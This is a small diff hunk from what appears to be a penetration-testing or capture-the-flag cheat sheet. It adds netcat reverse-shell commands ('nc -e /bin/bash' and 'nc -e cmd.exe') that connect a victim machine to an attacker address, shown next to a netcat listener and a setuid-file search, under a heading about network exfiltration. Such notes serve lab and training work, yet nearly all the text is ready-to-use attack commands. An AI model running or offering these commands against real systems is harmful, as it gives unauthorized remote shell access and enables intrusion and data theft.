@@ -339,7 +339,8 @@ find / -perm -4000 2>/dev/null
 nc -lnvp 12345
 
 # attackee:
-nc 10.10.14.69 12345
+nc -e /bin/bash 10.10.14.69 12345 # most nix.
+nc -e cmd.exe 10.10.14.69 12345 # windows.
 ```
 
 > exfiltration by piping over the network
